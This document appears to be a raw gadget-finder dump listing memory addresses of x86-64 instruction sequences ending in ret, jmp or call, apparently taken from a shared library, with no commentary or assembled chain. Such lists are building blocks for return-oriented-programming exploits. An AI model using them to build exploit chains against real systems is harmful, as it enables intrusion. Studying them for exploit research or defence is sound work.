0x00002aaaaab74009 : inc bl ; cmp dl, 1 ; jb 0x9f01f ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7475c : inc bl ; cmp dl, 1 ; jb 0x9f772 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab74ea9 : inc bl ; cmp dl, 1 ; jb 0x9febf ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7ea58 : inc bl ; cmp dl, 1 ; jb 0xa9a6a ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7ea57 : inc bl ; cmp dl, 1 ; jb 0xa9a6b ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac21f86 : inc bl ; jb 0x14cf96 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac22476 : inc bl ; jb 0x14d486 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac22816 : inc bl ; jb 0x14d826 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab63761 : inc bl ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaab1bda3 : inc byte ptr [r11 - 0x6bf00220] ; ret 0x8341
0x00002aaaaab50522 : inc byte ptr [rbp + 0x738948c9] ; cmp byte ptr [rdi], cl ; ret 0x389
0x00002aaaaab1bda4 : inc byte ptr [rbx - 0x6bf00220] ; ret 0x8341
0x00002aaaaaaff696 : inc byte ptr [rbx] ; je 0x2a6a5 ; pop rbx ; ret
0x00002aaaaac5cbbc : inc byte ptr [rdi + 0x7e8cfff3] ; call qword ptr [rdi]
0x00002aaaaab4c4f9 : inc byte ptr [rdx] ; je 0x7750f ; mov dword ptr [rdi], edx ; ret
0x00002aaaaabcacf1 : inc byte ptr [rdx] ; mov eax, 0x16 ; jbe 0xf5d0a ; ret
0x00002aaaaac6980b : inc dword ptr [rax + 0x10fffc0d] ; add ah, bh ; call rax
0x00002aaaaac69ae7 : inc dword ptr [rax + 0x18] ; cld ; call qword ptr [rax - 0x1f0003e7]
0x00002aaaaac69b3b : inc dword ptr [rax + 0x1f] ; cld ; call qword ptr [rax - 0x1f0003e0]
0x00002aaaaac6a28b : inc dword ptr [rax + 0x20fffc81] ; ja 0x195297 ; jmp rax
0x00002aaaaac699af : inc dword ptr [rax + 0x28] ; cld ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaac692a7 : inc dword ptr [rax + 0x28] ; sti ; jmp rax
0x00002aaaaac69a37 : inc dword ptr [rax + 0x2b] ; cld ; jmp qword ptr [rax]
0x00002aaaaac69a9f : inc dword ptr [rax + 0x2e] ; cld ; call qword ptr [rax]
0x00002aaaaabbbfd7 : inc dword ptr [rax + 0x3108384b] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaac69a07 : inc dword ptr [rax + 0x33] ; cld ; inc dword ptr [rax + 0x35] ; cld ; call rax
0x00002aaaaac69a0b : inc dword ptr [rax + 0x35] ; cld ; call rax
0x00002aaaaac692c7 : inc dword ptr [rax + 0x35] ; sti ; call qword ptr [rax]
0x00002aaaaac692cf : inc dword ptr [rax + 0x3a] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696af : inc dword ptr [rax + 0x40fffbd7] ; fsincos ; jmp qword ptr [rax]
0x00002aaaaac5d5d7 : inc dword ptr [rax + 0x51] ; hlt ; dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d787 : inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5b48b : inc dword ptr [rax + 0x5a] ; out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaac5b48f : inc dword ptr [rax + 0x5a] ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaac69b77 : inc dword ptr [rax + 0x5e] ; cld ; call rax
0x00002aaaaac5bbbb : inc dword ptr [rax + 0x5e] ; out dx, al ; call rsp
0x00002aaaaac6a48b : inc dword ptr [rax + 0x77] ; cld ; call rax
0x00002aaaaac698c7 : inc dword ptr [rax + 0xa] ; cld ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac698cb : inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac6921f : inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac6985b : inc dword ptr [rax + 5] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6c6c3 : inc dword ptr [rax + rcx - 0x4cbffff] ; out dx, eax ; call rsp
0x00002aaaaac6f59b : inc dword ptr [rax + rdi + 0x2ef40002] ; cli ; jmp rsp
0x00002aaaaac6991b : inc dword ptr [rax - 0x14] ; sti ; call qword ptr [rax - 0x1f000413]
0x00002aaaaac6994f : inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac6967f : inc dword ptr [rax - 0x21] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696b3 : inc dword ptr [rax - 0x27] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696cf : inc dword ptr [rax - 0x29] ; sti ; inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaac694ff : inc dword ptr [rax - 0x2e00024b] ; mov bh, 0xfd ; call rcx
0x00002aaaaac6997f : inc dword ptr [rax - 0x2f000408] ; stc ; sti ; jmp qword ptr [rax]
0x00002aaaaac6992b : inc dword ptr [rax - 0x2f00040f] ; sti ; jmp qword ptr [rax]
0x00002aaaaac697a3 : inc dword ptr [rax - 0x39] ; sti ; call qword ptr [rax - 0x1f000438]
0x00002aaaaab209d5 : inc dword ptr [rax - 0x4df43] ; jmp qword ptr [rax]
0x00002aaaaac5c3ef : inc dword ptr [rax - 0x4f000e00] ; add dl, dh ; jmp rax
0x00002aaaaab22c96 : inc dword ptr [rax - 0x51743] ; jmp qword ptr [rax]
0x00002aaaaac6a55b : inc dword ptr [rax - 0x53] ; cld ; call rax
0x00002aaaaac6a773 : inc dword ptr [rax - 0x56] ; cld ; call rax
0x00002aaaaaba5d78 : inc dword ptr [rax - 0x76b7ffc8] ; ret
0x00002aaaaac6a063 : inc dword ptr [rax - 0x7a] ; cld ; call rax
0x00002aaaaac6a27b : inc dword ptr [rax - 0x7d] ; cld ; call rax
0x00002aaaaac698a7 : inc dword ptr [rax - 0x7f0003f6] ; or al, 0xfc ; call qword ptr [rax]
0x00002aaaaac6996f : inc dword ptr [rax - 0xd] ; sti ; call qword ptr [rax - 0x1f00040c]
0x00002aaaaac5c46f : inc dword ptr [rax] ; add al, 0xf2 ; jmp qword ptr [rax]
0x00002aaaaac697d3 : inc dword ptr [rax] ; add bh, ah ; jmp rax
0x00002aaaaabcda88 : inc dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f6
0x00002aaaaab21985 : inc dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab2fef2 : inc dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x00002aaaaab36a3b : inc dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaab3584d : inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xffff
0x00002aaaaab8a93b : inc dword ptr [rax] ; add byte ptr [rax], al ; cmove eax, edx ; ret
0x00002aaaaac46c3d : inc dword ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaac43e77 : inc dword ptr [rax] ; add byte ptr [rax], al ; sub eax, ecx ; ret
0x00002aaaaab09efc : inc dword ptr [rax] ; add byte ptr [rcx], ch ; ret 0xd089
0x00002aaaaac5c4b3 : inc dword ptr [rax] ; add eax, 0x510fff2 ; jmp qword ptr [rax]
0x00002aaaaac698f3 : inc dword ptr [rax] ; cld ; call qword ptr [rax]
0x00002aaaaac6994b : inc dword ptr [rax] ; cld ; sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac696d3 : inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaac5c26b : inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaab3dda8 : inc dword ptr [rax] ; jmp 0x64b93
0x00002aaaaac6a9bf : inc dword ptr [rax] ; lahf ; cld ; push qword ptr [rax - 0x62] ; cld ; jmp rax
0x00002aaaaac6a763 : inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; cld ; call qword ptr [rax + 0x20fffcab]
0x00002aaaaac6a053 : inc dword ptr [rax] ; mov ah, bh ; call qword ptr [rax + 0x20fffc87]
0x00002aaaaac5d9cb : inc dword ptr [rax] ; mov ah, dh ; jmp rdx
0x00002aaaaabed830 : inc dword ptr [rax] ; or eax, edi ; bswap eax ; ret
0x00002aaaaac5c2df : inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac69d7f : inc dword ptr [rax] ; pop rbp ; cld ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69f8f : inc dword ptr [rax] ; push rcx ; cld ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaabd36dc : inc dword ptr [rax] ; ret
0x00002aaaaac69793 : inc dword ptr [rax] ; ret 0xfffb
0x00002aaaaac6927f : inc dword ptr [rax] ; sbb ebx, edi ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaac692d7 : inc dword ptr [rax] ; sti ; call rax
0x00002aaaaac699b3 : inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaac69a57 : inc dword ptr [rax] ; sub edi, esp ; jmp rax
0x00002aaaaac6a26b : inc dword ptr [rax] ; test edi, esp ; call qword ptr [rax + 0x20fffc84]
0x00002aaaaac69fcf : inc dword ptr [rax] ; xor al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaabf1b64 : inc dword ptr [rbp + 0x31] ; rol byte ptr [rbp - 0x6bf0be40], cl ; ret 0x8545
0x00002aaaaabf1d4a : inc dword ptr [rbp + 0x31] ; rol byte ptr [rbp - 0x6bf0be40], cl ; ret 0xf741
0x00002aaaaac150b0 : inc dword ptr [rbp + 0x480b78c0] ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe6f9f : inc dword ptr [rbp + 0x49d674c0] ; mov eax, dword ptr [rsp + 0x38] ; jmp 0x111f79
0x00002aaaaac5d69b : inc dword ptr [rbp + 0x53] ; hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d937 : inc dword ptr [rbp + 0x55] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac025b2 : inc dword ptr [rbp + 0x5b0975c0] ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac6eaab : inc dword ptr [rbp + 0x69340001] ; clc ; call rsp
0x00002aaaaac6ba2b : inc dword ptr [rbp + rsi*4 - 0x5f4c0000] ; in eax, dx ; jmp rsp
0x00002aaaaab0f6f3 : inc dword ptr [rbp - 0x3db7f040] ; pop rbx ; ret
0x00002aaaaabcfaec : inc dword ptr [rbp - 0x76608a40] ; out dx, eax ; call 0xf6d09
0x00002aaaaab38df9 : inc dword ptr [rbp - 0x76808b40] ; ret
0x00002aaaaab3d4e8 : inc dword ptr [rbp - 0x76818b40] ; ret
0x00002aaaaabf5e0f : inc dword ptr [rbp - 0x769b8740] ; ret
0x00002aaaaabf61e1 : inc dword ptr [rbp - 0x76a18740] ; ret
0x00002aaaaab38ad1 : inc dword ptr [rbp - 0x76cd8b40] ; ret
0x00002aaaaab3dac4 : inc dword ptr [rbp - 0x76e38b40] ; ret
0x00002aaaaab3aac6 : inc dword ptr [rbp - 0x77] ; jmp 0x64bfb
0x00002aaaaabf1bba : inc dword ptr [rbp - 0x7b] ; dec dword ptr [rdi] ; lahf ; ret 0xc2e9
0x00002aaaaab350b8 : inc dword ptr [rbp - 0x7b] ; ror byte ptr [rdi], 0x85 ; ret 0x31
0x00002aaaaabd415f : inc dword ptr [rbp - 0x7ce38b40] ; ret
0x00002aaaaabd41aa : inc dword ptr [rbp - 0x7cee8b40] ; ret
0x00002aaaaac5634f : inc dword ptr [rbx + 0x25] ; jmp 0x18135b
0x00002aaaaab25eb6 : inc dword ptr [rbx + 0x394401c3] ; jrcxz 0x50f3b ; ret 0x8945
0x00002aaaaab28b28 : inc dword ptr [rbx + 0x394401c3] ; jrcxz 0x53bad ; ret
0x00002aaaaab99e22 : inc dword ptr [rbx + 0x634801c3] ; fisttp dword ptr [rax + 0x39] ; ret
0x00002aaaaab9b55f : inc dword ptr [rbx + 0xb801eb] ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret
0x00002aaaaac16dad : inc dword ptr [rbx + 0xd74fff8] ; add rsp, 8 ; ret
0x00002aaaaac6e53b : inc dword ptr [rbx + rax*8 - 0x1a3bffff] ; idiv edi ; pushfq ; ret
0x00002aaaaababee5 : inc dword ptr [rbx + rcx*4 + 0x73] ; sub al, 0x83 ; ret 0x4801
0x00002aaaaabc756f : inc dword ptr [rbx + rcx*4 + 5] ; mov ecx, 0x89002d61 ; ret
0x00002aaaaab2f2eb : inc dword ptr [rbx - 0x10b743] ; jmp qword ptr [rax]
0x00002aaaaac5b377 : inc dword ptr [rbx - 0x13] ; in eax, dx ; call qword ptr [rax]
0x00002aaaaab0838e : inc dword ptr [rbx - 0x2f7cfe08] ; dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaabbc26b : inc dword ptr [rbx - 0x72b2fd40] ; std ; add byte ptr [rcx], bh ; ret
0x00002aaaaab3c892 : inc dword ptr [rbx - 0x78f0d008] ; mov edi, 0x89000000 ; ret 0x348
0x00002aaaaab358f6 : inc dword ptr [rbx - 0x78f0d008] ; test eax, 0x89000007 ; ret 0x348
0x00002aaaaabf740f : inc dword ptr [rbx - 0xc8b0a08] ; pop rbx ; ret
0x00002aaaaab0ffba : inc dword ptr [rbx] ; add byte ptr [rax], al ; xor eax, ecx ; ret
0x00002aaaaabac0c3 : inc dword ptr [rbx] ; cmp byte ptr [rcx + 8], 2 ; jne 0xd70a9 ; jmp 0xd7099
0x00002aaaaab7f128 : inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab7f04f : inc dword ptr [rbx] ; pop rbx ; ret
0x00002aaaaab3a88f : inc dword ptr [rcx + 0x80e2] ; add dh, dh ; ret
0x00002aaaaab2c6c9 : inc dword ptr [rcx + 0xf] ; mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x00002aaaaabf9194 : inc dword ptr [rcx + 0xf] ; xchg eax, esp ; ret 0x3945
0x00002aaaaab3fa4f : inc dword ptr [rcx + rcx*4 - 0x19] ; mov dword ptr [rsp + 0xc], edx ; call 0xf6d0a
0x00002aaaaac6a3ff : inc dword ptr [rcx + rdi*2] ; cld ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac5d4e7 : inc dword ptr [rcx - 0x25] ; call rcx
0x00002aaaaab3c491 : inc dword ptr [rcx - 0x44] ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x63705
0x00002aaaaac69407 : inc dword ptr [rcx - 0x57] ; std ; jmp rcx
0x00002aaaaabc20f5 : inc dword ptr [rcx - 0x73] ; push rbp ; dec dword ptr [rax + 0x63] ; ret 0x8d48
0x00002aaaaab8c272 : inc dword ptr [rcx - 0x77] ; fisttp qword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret
0x00002aaaaab0076c : inc dword ptr [rcx - 0x77] ; ret
0x00002aaaaabb005d : inc dword ptr [rcx - 0x77] ; ret 0x8b49
0x00002aaaaabb83da : inc dword ptr [rcx - 0x77] ; ror dword ptr [rdi], -0x6c ; ret 0x3ae9
0x00002aaaaabb83d6 : inc dword ptr [rcx - 0x7d] ; cld ; inc dword ptr [rcx - 0x77] ; ror dword ptr [rdi], -0x6c ; ret 0x3ae9
0x00002aaaaab215ad : inc dword ptr [rcx - 0x7d] ; in al, dx ; add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x00002aaaaabebbca : inc dword ptr [rcx - 9] ; add al, 0x24 ; add byte ptr [rax - 0x76b80000], al ; ret 0x4875
0x00002aaaaabf6f1a : inc dword ptr [rcx] ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaac489c9 : inc dword ptr [rcx] ; ja 0x1739d4 ; ret
0x00002aaaaac908af : inc dword ptr [rcx] ; or al, 0xa5 ; add ebp, eax ; add ebp, esi ; add al, byte ptr [rax] ; ret
0x00002aaaaac909e6 : inc dword ptr [rcx] ; or ch, byte ptr [rdi + 5] ; ret
0x00002aaaaac90880 : inc dword ptr [rcx] ; or ebx, eax ; add dword ptr [rbx], eax ; cmc ; add al, byte ptr [rax] ; ret
0x00002aaaaac5b1c7 : inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5b1cb : inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaabb3494 : inc dword ptr [rcx] ; ret
0x00002aaaaabab348 : inc dword ptr [rcx] ; ret 0x5589
0x00002aaaaabb309a : inc dword ptr [rcx] ; ret 0x8b49
0x00002aaaaac6a1d7 : inc dword ptr [rdi + rax*4 - 4] ; call rsp
0x00002aaaaac69ceb : inc dword ptr [rdi + rbx*2 - 4] ; call rsp
0x00002aaaaab9a9d0 : inc dword ptr [rdi + rcx + 0x49] ; ret
0x00002aaaaab6d3e3 : inc dword ptr [rdi + rcx - 0x4a] ; or byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabb53c7 : inc dword ptr [rdi + rcx - 0x4a] ; xor byte ptr [rax - 0x77], cl ; ret 0x8041
0x00002aaaaac6958f : inc dword ptr [rdi - 0x49] ; std ; call rcx
0x00002aaaaac5d05f : inc dword ptr [rdi - 0x587b000d] ; jmp rax
0x00002aaaaabb0506 : inc dword ptr [rdi] ; jbe 0xdb519 ; mov eax, 0xc ; ret
0x00002aaaaac5d5c3 : inc dword ptr [rdi] ; push rcx ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d6e7 : inc dword ptr [rdi] ; push rsp ; hlt ; call qword ptr [rcx]
0x00002aaaaac69c23 : inc dword ptr [rdx + 0x60] ; cld ; call rdx
0x00002aaaaac6d183 : inc dword ptr [rdx + rdx*2 + 0x8040001] ; hlt ; call rsp
0x00002aaaaac6f263 : inc dword ptr [rdx - 0x366bfffe] ; stc ; call rsp
0x00002aaaaac6a647 : inc dword ptr [rdx - 0x58] ; cld ; call rdx
0x00002aaaaac5cb7f : inc dword ptr [rdx - 0x76] ; jmp rdx
0x00002aaaaac6a637 : inc dword ptr [rdx] ; stosb byte ptr [rdi], al ; cld ; call qword ptr [rdx + 0x22fffca9]
0x00002aaaaac1fd7d : inc dword ptr [rip - 0x7cb80000] ; ret 0x4910
0x00002aaaaac69bbf : inc dword ptr [rsi + 0x5d] ; cld ; call rsi
0x00002aaaaac6f0cb : inc dword ptr [rsi + rdx - 0x78bbfffe] ; stc ; call rsp
0x00002aaaaac6a5a3 : inc dword ptr [rsi - 0x54] ; cld ; call rsi
0x00002aaaaac69433 : inc dword ptr [rsi - 0x5a] ; std ; call rsi
0x00002aaaaac6a0ab : inc dword ptr [rsi - 0x7b] ; cld ; call rsi
0x00002aaaaac69baf : inc dword ptr [rsi] ; pop rdi ; cld ; call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac6a593 : inc dword ptr [rsi] ; scasb al, byte ptr [rdi] ; cld ; call qword ptr [rsi + 0x26fffcad]
0x00002aaaaac6a09b : inc dword ptr [rsi] ; xchg esp, edi ; call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac5ec27 : inc dword ptr [rsi] ; xor esi, 0xf67ce2ff ; jmp rax
0x00002aaaaac6f3db : inc dword ptr [rsp + rbp + 0x3440002] ; cli ; call rsp
0x00002aaaaac5d43f : inc dword ptr [rsp + rbx*8 - 0x3bdb000d] ; jmp qword ptr [rdi]
0x00002aaaaac69b1b : inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac5c4a3 : inc eax ; add al, 0xf2 ; call rax
0x00002aaaaac5c487 : inc eax ; add al, 0xf2 ; jmp rax
0x00002aaaaac5c467 : inc eax ; add esi, edx ; jmp rax
0x00002aaaaac69b07 : inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaac5d563 : inc eax ; hlt ; inc eax ; hlt ; jmp rax
0x00002aaaaac5d567 : inc eax ; hlt ; jmp rax
0x00002aaaaac6993b : inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac5c25b : inc eax ; in al, dx ; int1 ; call rax
0x00002aaaaac6a4c7 : inc eax ; ja 0x1954cf ; push qword ptr [rax] ; ja 0x1954d3 ; call rax
0x00002aaaaac5e3ff : inc eax ; mov dr0, ebp ; call rsi
0x00002aaaaac5c2cf : inc eax ; out dx, al ; int1 ; call rax
0x00002aaaaac5c00b : inc eax ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac5c3df : inc eax ; push rcx ; push rax ; push rcx ; jmp qword ptr [rax]
0x00002aaaaac5d993 : inc eax ; push rdx ; hlt ; inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d997 : inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaac697c3 : inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaab09f19 : inc eax ; shr eax, 0x1f ; ret
0x00002aaaaac6932b : inc eax ; sti ; call qword ptr [rax]
0x00002aaaaac6a57b : inc eax ; test eax, 0xa950fffc ; cld ; jmp rax
0x00002aaaaac5e919 : inc ebx ; add dh, bh ; jmp rdi
0x00002aaaaac1508a : inc ebx ; mov eax, 0xffffffff ; ret
0x00002aaaaab0b8cc : inc ebx ; nop ; mov eax, edx ; ret
0x00002aaaaab49f5c : inc ebx ; nop ; xor eax, eax ; ret
0x00002aaaaac414d6 : inc ebx ; nop dword ptr [rax + rax] ; ret
0x00002aaaaac46729 : inc ebx ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab4e1c8 : inc ebx ; nop word ptr [rax + rax] ; ret
0x00002aaaaab31b56 : inc esi ; add al, 1 ; add dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x00002aaaaabd29c9 : inc esi ; jmp qword ptr [r8]
0x00002aaaaac6942f : inc esi ; movsd dword ptr [rdi], dword ptr [rsi] ; std ; inc dword ptr [rsi - 0x5a] ; std ; call rsi
0x00002aaaaac6c55b : inc esp ; add dword ptr [rcx], eax ; add byte ptr [rcx + rax*4], dh ; out dx, eax ; jmp rsp
0x00002aaaaac6b19b : inc esp ; jle 0x1961a7 ; add byte ptr [rdi + rax - 0x16], al ; jmp rsp
0x00002aaaaac6d653 : inc esp ; jne 0x198660 ; add byte ptr [rdx + rcx - 0xa], ah ; jmp rsp
0x00002aaaaac6bc3b : inc esp ; ret 0
0x00002aaaaac6e4fb : inc esp ; ret 1
0x00002aaaaac6e8db : inc esp ; salc ; add dword ptr [rax], eax ; xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaabab347 : inc qword ptr [rcx] ; ret 0x5589
0x00002aaaaac811a4 : insb byte ptr [rdi], dx ; adc al, byte ptr [rcx] ; add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac80ac0 : insb byte ptr [rdi], dx ; add byte ptr [rax], al ; add byte ptr [rbx + rcx - 0x7847ffff], cl ; call qword ptr [rsi]
0x00002aaaaac1acf4 : insb byte ptr [rdi], dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac02280 : insb byte ptr [rdi], dx ; add dword ptr [rax], eax ; add dh, dh ; ret 0xf04
0x00002aaaaac8fc66 : insb byte ptr [rdi], dx ; add dword ptr [rdx], ecx ; ret
0x00002aaaaab3b3b4 : insb byte ptr [rdi], dx ; add eax, dword ptr [rdi + rcx] ; test byte ptr [rbp - 0x7cfffffe], ah ; ret 0x3901
0x00002aaaaabc4452 : insb byte ptr [rdi], dx ; and al, 0x18 ; add dword ptr [rax - 0x75], ecx ; and al, 0x18 ; mov rdx, rax ; jmp 0xef49e
0x00002aaaaab53c42 : insb byte ptr [rdi], dx ; and al, 0x24 ; pop rbp ; mov dword ptr [r12 + 0x14], eax ; pop r12 ; ret
0x00002aaaaab9cf57 : insb byte ptr [rdi], dx ; and al, 0x30 ; mov rdi, rbx ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaabfbec0 : insb byte ptr [rdi], dx ; and al, 0x40 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab09f9b : insb byte ptr [rdi], dx ; and al, 0xe8 ; fld st(0) ; fstp xword ptr [rdi] ; fsubp st(1) ; ret
0x00002aaaaab0a02a : insb byte ptr [rdi], dx ; and al, 0xe8 ; fstp xword ptr [rdi] ; ret
0x00002aaaaab0a008 : insb byte ptr [rdi], dx ; and al, 0xe8 ; ret
0x00002aaaaab0a1aa : insb byte ptr [rdi], dx ; and al, 0xfe ; ret
0x00002aaaaab0a059 : insb byte ptr [rdi], dx ; and al, 8 ; fscale ; fstp st(1) ; ret
0x00002aaaaab09f3a : insb byte ptr [rdi], dx ; and al, 8 ; ret
0x00002aaaaab51f64 : insb byte ptr [rdi], dx ; call qword ptr [rax]
0x00002aaaaac84b79 : insb byte ptr [rdi], dx ; cmc ; call qword ptr [rcx]
0x00002aaaaac84ae9 : insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac837a4 : insb byte ptr [rdi], dx ; cmp byte ptr [rcx], al ; add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac5a23e : insb byte ptr [rdi], dx ; insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x00002aaaaac789a4 : insb byte ptr [rdi], dx ; mov al, byte ptr [rax] ; add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaabc7940 : insb byte ptr [rdi], dx ; mov bl, 0xf9 ; dec dword ptr [rax - 0x77] ; ret 0x3145
0x00002aaaaac067c2 : insb byte ptr [rdi], dx ; mov eax, 1 ; ret
0x00002aaaaaad8670 : insb byte ptr [rdi], dx ; mov ebx, 0x952a6c41 ; ret
0x00002aaaaabac3a8 : insb byte ptr [rdi], dx ; mov edx, 0x840f002e ; ret 2
0x00002aaaaac8e5a4 : insb byte ptr [rdi], dx ; out 1, al ; add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaac6e534 : insb byte ptr [rdi], dx ; ret
0x00002aaaaab3ad60 : insb byte ptr [rdi], dx ; ret 0
0x00002aaaaac8a8a4 : insb byte ptr [rdi], dx ; test eax, 0xe2080001 ; sti ; call rsi
0x00002aaaaac831a4 : insb byte ptr [rdi], dx ; xor al, byte ptr [rcx] ; add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac1d960 : insd dword ptr [rdi], dx ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac76cb5 : insd dword ptr [rdi], dx ; add byte ptr [rax], al ; cwde ; adc ebp, ebp ; call rsi
0x00002aaaaab6bd6f : insd dword ptr [rdi], dx ; add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaac1e860 : insd dword ptr [rdi], dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab41e31 : insd dword ptr [rdi], dx ; add dword ptr [rax], eax ; add byte ptr [rbx - 0x7bf0fd1e], al ; ret 1
0x00002aaaaac33807 : insd dword ptr [rdi], dx ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac6d019 : insd dword ptr [rdi], dx ; call rsp
0x00002aaaaac84c39 : insd dword ptr [rdi], dx ; cmc ; call qword ptr [rax]
0x00002aaaaac84bf1 : insd dword ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabd8ed7 : insd dword ptr [rdi], dx ; enter 0x22e8, -0x79 ; cli ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac5cb98 : insd dword ptr [rdi], dx ; jl 0x187b91 ; jmp rdx
0x00002aaaaac5cbb0 : insd dword ptr [rdi], dx ; jl 0x187bad ; lcall ptr [rsi + rcx*4 - 0xd] ; jmp rdx
0x00002aaaaac7aa61 : insd dword ptr [rdi], dx ; out dx, al ; jmp rdx
0x00002aaaaac5a23f : insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x00002aaaaaad6bf4 : insd dword ptr [rdi], dx ; ret 0x1bb7
0x00002aaaaac585ed : insd dword ptr [rdi], dx ; ret 0xb9b9
0x00002aaaaab5db0e : insd dword ptr [rdi], dx ; stc ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rax + rbp + 0x48], 0x89 ; ret 0x8948
0x00002aaaaac594ff : insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x00002aaaaac5cb34 : insd dword ptr [rdi], dx ; xchg bl, dh ; dec dword ptr [rbp - 0x21000c84] ; test esi, ebx ; call qword ptr [rax]
0x00002aaaaabffff6 : int 0x29
0x00002aaaaabd2512 : int 0x31
0x00002aaaaab1d613 : int 0x48
